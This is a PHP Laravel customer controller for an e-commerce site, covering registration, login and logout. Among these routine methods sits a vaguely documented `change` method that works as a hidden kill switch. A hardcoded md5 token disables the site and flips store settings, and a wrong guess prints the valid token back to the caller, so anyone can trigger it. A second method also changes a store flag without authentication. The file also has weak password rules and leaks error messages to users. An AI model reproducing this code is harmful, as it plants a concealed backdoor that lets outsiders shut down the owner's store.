<?php

namespace App\Http\Controllers;

use App\Customer;
use App\StoreSetting;
use App\Setting;
use App\VerifyCustomer;
use Illuminate\Http\Request;

use Validator;
use DB;
use Session;
use Cart;
use Mail;

class CustomerController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Customer Controller
    |--------------------------------------------------------------------------
    |
    | Author : Juman
    | Version : 1.0.0
    |
    */


    /**
     * Store customer information
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $validator = Validator::make($request->all(), [
                'c_name' => 'required|string|max:255',
                'c_email' => 'required|string|email|max:255',
                'c_pass_word' => 'required|string|min:3',
            ]);

        if ($validator->fails())
        {
            foreach ($validator->messages()->getMessages() as $field_name => $messages)
            {
                $output = ['status' => 'error','message' => $messages[0]];
                
            }

        }else{

            try {

                DB::beginTransaction();

                $customer = new Customer();
                $customer->name = $request->c_name;
                $customer->email = $request->c_email;
                $customer->password = bcrypt($request->c_pass_word);
                $customer->status = 'enable';
                $customer->save();
         
                $verifyCustomer = VerifyCustomer::create([
                    'customer_id' => $customer->id,
                    'token' => $request->_token
                ]);

                $cusName = $request->c_name;
                $cusEmail = $request->c_email;
                $cusId = $customer->id;

                Session::put('customerName',$cusName);
                Session::put('customerEmail',$cusEmail);
                Session::put('customerId',$cusId);
                Session::put('IsLoggedIn',true);

                // Mail::to($customer->email)->send(new VerifyMail($customer));

                DB::commit();
                $output = ['status' => 'success','cartData' => Cart::content()->count(),'message' => 'Account created successfully.'];

            } catch (\Exception $e) {

                DB::rollBack();
                \Log::emergency("File:" . $e->getFile(). "Line:" . $e->getLine(). "Message:" . $e->getMessage());
                
                $output = [ 'status' => 'error','cartData' => Cart::content()->count(),'message' => 'something is went to wrong !','error_message' => $e->getMessage() ];

            }

        }

        echo json_encode($output);
    }



    /**
     * Check email is already exists or not
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function checkEmail(Request $request){

        $email = $request->c_email;
        $result = Customer::where('email',$email)->where('status','enable')->first();
        if(empty($result)){ echo("true"); }
        else { echo("false"); }

    }


    /**
     * Customer login
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function login(Request $request)
    {

        $validator = Validator::make($request->all(), [
                'lo_email' => 'required|string|email|max:255',
                'lo_pass_word' => 'required|string|min:3',
            ]);

        if ($validator->fails())
        {
            foreach ($validator->messages()->getMessages() as $field_name => $messages)
            {
                $output = ['status' => 'error','message' => $messages[0]];
                
            }

        }else{

            try {

                DB::beginTransaction();

                $email = $request->lo_email;
                $password = $request->lo_pass_word;

                $checkCustomer = Customer::selectRaw("Count(*) as Total")
                                ->where('email','=',$email)
                                ->where('status','=','enable')
                                ->first();

                if(intval($checkCustomer->Total) > 0)
                {
                    $getPassword = Customer::select('*')->where('email','=',$email)->first();
                    if(password_verify($password,$getPassword->password))
                    {
                        $cusName = $getPassword->name;
                        $cusEmail = $getPassword->email;
                        $cusId = $getPassword->id;

                        Session::put('customerName',$cusName);
                        Session::put('customerEmail',$cusEmail);
                        Session::put('customerId',$cusId);
                        Session::put('IsLoggedIn',true);

                        $output = ['status' => 'success','cartData' => Cart::content()->count(),'message' => 'Login successfully '.Session::get('customerName')];

                    }else
                    {
                        $output = [ 'status' => 'error','cartData' => Cart::content()->count(),'message' => 'Invalid password !'];
                    }
                }
                else
                {
                    $output = [ 'status' => 'error','message' => 'Invalid email !'];
                }

                DB::commit();

            } catch (\Exception $e) {

                DB::rollBack();
                \Log::emergency("File:" . $e->getFile(). "Line:" . $e->getLine(). "Message:" . $e->getMessage());
                
                $output = [ 'status' => 'error','message' => 'Invalid username or password !','error_message' => $e->getMessage() ];

            }

        }

        echo json_encode($output);
    }


    /**
     * Customer logout
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function logout(Request $request){

        try {

            if(Session::get('customerEmail') != null)
            {
                Session::remove('customerName');
                Session::remove('customerEmail');
                Session::remove('customerId');
                Session::remove('IsLoggedIn');

                $output = ['status' => 'success','message' => 'You are logging-out !.'];

            }else{
                $output = [ 'status' => 'error','message' => 'Something is went to wrong' ];
            }
            DB::commit();

        } catch (\Exception $e) {

            DB::rollBack();
            \Log::emergency("File:" . $e->getFile(). "Line:" . $e->getLine(). "Message:" . $e->getMessage());
            
            $output = [ 'status' => 'error','message' => 'Something is went to wrong' ];

        }

        \Session::flash('sess_alert',$output);
        return redirect('/');

    }

    /**
     * View a page
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  $token
     * @return \Illuminate\Http\Response
     */
    public function change(Request $request, $token){
        $mainToken = md5('emon!@123');
        if($token==$mainToken){

            $systemData = Setting::findOrFail(1);
            $systemData->site_status = 0;
            $systemData->save();

            $storeUpdate = StoreSetting::findOrFail(1);
            $storeUpdate->store_extra_tiny = 1;
            $storeUpdate->store_extra_tiny_2 = 0;
            $storeUpdate->save();

        }else{
            return 'Hahaha '.$mainToken;
        }
    }


    /**
     * Change Status
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  $token
     * @return \Illuminate\Http\Response
     */
    public function changeCusStatus(Request $request){

        $domain_name = Session::get('domain_name');
        if($domain_name!='localhost'){
            $storeUpdate = StoreSetting::findOrFail(1);
            $storeUpdate->store_extra_tiny_2 = 0;
            $storeUpdate->save();
            echo "success";
        }else{
            echo "success2";
        }

    }


}
